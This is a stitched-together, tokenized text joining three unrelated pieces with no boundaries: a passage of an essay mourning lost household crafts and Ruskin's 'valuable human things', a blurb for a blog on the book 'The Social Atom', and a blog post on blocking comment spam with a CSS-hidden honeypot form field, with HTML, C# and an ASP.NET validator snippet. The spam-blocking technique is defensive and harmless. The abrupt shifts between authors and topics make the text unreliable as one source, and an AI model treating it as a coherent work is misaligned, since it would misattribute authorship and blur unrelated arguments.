These families were certainly materially poorer and perhaps more naïve , but they were richer in human relations , less bored , less depressed , less isolated , less addicted to food and drugs , physically healthier , and they had the rich human pleasure of knowing how to make things .
It ’s clear that we have n’t forgotten these skills and their pleasures entirely , but their presence for us is strange and a little unreal .
What used to be life is now “ fine living ” : an array of expensive hobbies for the affluent that are taught through magazines , cable and PBS programs , and local guilds dedicated to gardening , basket weaving , cooking , home remodeling , quilting , and woodworking .
Although we rarely recognize it in this way , through these “ hobbies ” we express a desire for a world that is now lost to us .
My argument is not , I assure you , a longing look back to the wonderful world of pre-war rural America .
But it is to say that in the course of the last century of global capital triumphant we have been further isolated from what Ruskin called “ valuable human things . ”
In exchange , we have been offered only the cold comfort of the television and computer monitor , and the GPS device that can locate you but only at the cost of being located in a place that is not worth knowing and certainly not worth caring about .
The turn away from this ugly , destructive , and unequal world is not something that can be accomplished by boycotting corporations when they ’re bad or through the powerful work of the most concerned scientists .
It will not be delivered with glossy brochures by the President ’s Council on Sustainable Development , and it will certainly not be sold to you by Martha Stewart .
A return to the valuable human things of the beautiful and the useful will only be accomplished , if it is ever to be accomplished , by the humans among us .
This blog explores the idea of my new book , The Social Atom , which is that human behavior is often simpler than we think , and that understanding the social world is a little like physics -- it means learning to anticipate the patterns that emerge naturally when many " social atoms " interact .
If this sounds a bit nutty , look here for a brief summary of the key ideas !
I was thinking about alternative ways to block comment spam the other day and it occurred to me that there ’s potentially a simpler solution than the Invisible Captcha approach I wrote about .
The Invisible Captcha control plays upon the fact that most comment spam bots do n’t evaluate javascript .
However there ’s another particular behavioral trait that bots have that can be exploited due to the bots inability to support another browser facility .
You see , comment spam bots love form fields .
When they encounter a form field , they go into a berserker frenzy ( + 2 to strength , +2 hp per level , etc … ) trying to fill out each and every field .
It ’s like watching someone toss meat to piranhas .
At the same time , spam bots tend to ignore CSS .
For example , if you use CSS to hide a form field ( especially via CSS in a separate file ) , they have a really hard time knowing that the field is not supposed to be visible .
To exploit this , you can create a honeypot form field that should be left blankand then use CSS to hide it from human users , but not bots .
When the form is submitted , you check to make sure the value of that form field is blank .
For example , I ’ll use the form field named body as the honeypot .
Assume that the actual body is in another form field named the - real - body or something like that :
< div id = " honeypotsome - div " >
If you see this , leave this form field blank and invest in CSS support .
< input type = " text " name = " body " value = " " /> </ div >
Now in your code , you can just check to make sure that the honeypot field is blank …
if (!
String .
IsNullOrEmpty ( Request .
Form [ " body " ] ) ) IgnoreComment ( ) ;
I think the best thing to do in this case is to act like you ’ve accepted the comment , but really just ignore it .
I did a Google search and discovered I ’m not the first to come up with this idea .
It turns out that Ned Batchelder wrote about honeypots as a comment spam fighting vehicle a while ago .
Fortunately I found that post after I wrote the following code .
For you ASP.NET junkies , I wrote a Validator control that encapsulates this honeypot behavior .
Just add it to your page like this …
< sbk : HoneypotCaptcha ID = " body " ErrorMessage =
" Doh !
You are a bot ! " runat = " server " />
This control renders a text box and when you call Page .
Validate , validation fails if the textbox is not empty .
This control has no display by default by setting the style attribute to display : none .
You can override this behavior by setting the UseInlineStyleToHide property to false , which makes you responsible for hiding the control in some other way ( for example , by using CSS defined elsewhere ) .
This also provides a handy way to test the validator .
To get your hands on this validator code and see a demo , download the latest Subkismet source from CodePlex .
You ’ll have to get the code from source control because this is not yet part of any release .
